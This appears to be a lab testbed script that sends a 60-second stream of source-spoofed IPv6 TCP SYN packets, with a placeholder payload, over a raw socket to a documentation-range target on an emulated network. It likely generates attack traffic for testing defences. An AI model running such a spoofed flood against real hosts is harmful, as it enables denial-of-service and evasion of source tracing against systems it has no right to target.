import os
import socket
import sys
import time

from packet_utils import build_ethernet_header, build_ipv6_tcp

target_ip = sys.argv[1] if len(sys.argv) > 1 else "2001:db8:2::101"
target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 8000

# Configure IPv6 address and static neighbor to prevent neighbor discovery delays
os.system("echo 0 > /proc/sys/net/ipv6/conf/all/disable_ipv6 2>/dev/null")
os.system("echo 0 > /proc/sys/net/ipv6/conf/h2-eth0/disable_ipv6 2>/dev/null")
os.system("echo 0 > /proc/sys/net/ipv6/conf/h2-eth0/accept_dad 2>/dev/null")
os.system("ip -6 addr add 2001:db8:2::101/64 dev h2-eth0 2>/dev/null")
os.system("ip -6 route add 2001:db8:1::/64 dev h2-eth0 2>/dev/null")
os.system(
    "ip -6 neigh add 2001:db8:1::101 lladdr 00:04:00:00:01:01 dev h2-eth0 2>/dev/null"
)

print("Starting IPv6 single spoofed attack to %s:%d" % (target_ip, target_port))
start_time = time.time()
seq = 1024

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind(("h2-eth0", 0))

eth_hdr = build_ethernet_header("00:04:00:00:02:01", "00:04:00:00:01:01", 0x86DD)
payload = b"MALICIOUS_PAYLOAD".ljust(1024, b"X")
spoofed_src = "2001:db8:1::99"

while time.time() - start_time < 60.0:
    ipv6_tcp_payload = build_ipv6_tcp(
        spoofed_src, target_ip, 50000, target_port, "S", seq, payload=payload
    )
    pkt = eth_hdr + ipv6_tcp_payload
    s.send(pkt)
    seq += 1024
    time.sleep(0.001)

s.close()
time.sleep(5)
